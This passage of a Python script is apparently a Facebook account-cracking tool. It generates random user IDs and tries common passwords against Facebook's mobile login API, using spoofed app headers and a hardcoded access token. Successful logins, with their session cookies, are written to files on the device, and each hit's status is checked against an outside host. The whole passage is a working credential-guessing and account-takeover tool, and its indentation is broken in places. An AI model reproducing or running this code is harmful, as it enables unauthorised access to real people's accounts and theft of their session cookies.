                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = po['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}SABBIR-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/SABBIR-BY-SABBIR-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/SABBIR-BY-SABBIR-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
 
#-_-_-_-_-_-_-_-<-OLD-MENU->-_-_-_-_-_-_-_-#
    def ___OLDX___():
    clear();print(f'\x1b[38;5;46m•\x1b[1;97m EXAMPLE \x1b[38;5;197m:\x1b[38;5;46m 9999 \x1b[1;97m|\x1b[38;5;46m 99999 \x1b[1;97m|\x1b[38;5;46m 999999 \x1b[1;97m|\x1b[38;5;46m 9999999 ');linex();limit = int(input(f'\x1b[38;5;46m•\x1b[1;97m SELECT  \x1b[38;5;197m:\x1b[38;5;46m '))
    clear()
    print(f'\x1b[38;5;46m•\x1b[1;97m 1 METHOD D1 \x1b[38;5;46m- \x1b[1;97mGRAPH\n\x1b[38;5;46m•\x1b[1;97m 2 METHOD D2 \x1b[38;5;46m- \x1b[1;97mB-GRAPH');linex()
    mthd=input(f'\x1b[38;5;46m•\x1b[1;97m CHOICE \x1b[38;5;197m: \x1b[38;5;46m')
    rangex="10000"
    for i in range(int(limit)):
        data=str(random.choice(range(1000000000,1999999999)))
        user.append(data)
    with tred(max_workers=40) as crack_submit:
        clear();total_ids=str(len(user))
        clear();print(f"\x1b[38;5;46m•\x1b[1;97m USER NAME \x1b[38;5;197m:\x1b[38;5;46m {username}");print(f"\x1b[38;5;46m•\x1b[1;97m TOKEN \x1b[38;5;197m:\x1b[38;5;46m {xxd}");linex()
        print(f'\x1b[38;5;46m•\x1b[1;97m TOTAL UID \x1b[38;5;197m:\x1b[38;5;46m {total_ids} ');print(f'\x1b[38;5;46m•\x1b[1;97m IF NO RESULT {A}(\x1b[38;5;46mON{A}|\x1b[38;5;197mOFF{A}) AIRPLAN MODE \x1b[1;97m(\x1b[38;5;46mD\x1b[38;5;197m{mthd}{A}) ');linex()
        for HopXd in user:
            uid=rangex+HopXd
            if mthd in ['1','01']:
                crack_submit.submit(__method__1,uid,total_ids)
            if mthd in ['2','02']:
                crack_submit.submit(__method__2,uid,total_ids)
#-_-_-_-_-_-_-_-<-OLD-M->-_-_-_-_-_-_-_-#
    def _O_l_D_(self,ids):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-O1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                data = {
                'adid':str(uuid.uuid4()),
                'format': 'json',
                'device_id':str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password', 
                'error_detail_type': 'button_with_disabled', 
                'source': 'device_based_login', 
                'email':str(ids),
                'password':str(pas),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                'generate_session_cookies': '1', 
                'meta_inf_fbmeta': '', 
                'advertiser_id':str(uuid.uuid4()),
                'currently_logged_in_userid': '0', 
                'locale': 'en_US',
                'client_country_code': 'US', 
                'method': 'auth.login', 
                'fb_api_req_friendly_name': 'authenticate', 
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': self.__OLD__(),
                'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'graph.facebook.com', 
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE', 
                'X-Tigon-Is-Retry': 'False', 
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
                'x-fb-device-group': '5120', 
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
                'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 
                'X-FB-Client-IP': 'True', 
                'X-FB-Server-Cluster': 'True', 
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
                'Content-Length': '706'}
                url = "https://b-graph.facebook.com/auth/login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    print(f"\r\r{vb}{G}/{W}>{B}sabbir-OK{W}< {vcv}{B} {ids}{G} / {B}{pas} \033[1;97m")
                    open('/sdcard/sabbir-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                    open('/sdcard/SABBIR-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-UA-2->-_-_-_-_-_-_-_-#
    def __sex__():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5\x1b[1;97m.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#-_-_-_-_-_-_-_-<-END-CALL->-_-_-_-_-_-_-_-#
if __name__ == "__main__":
    _G_i_F_t_()._M_e_N_u_()
#-_-_-_-_-_-_-_-<-END->-_-_-_-_-_-_-_-#
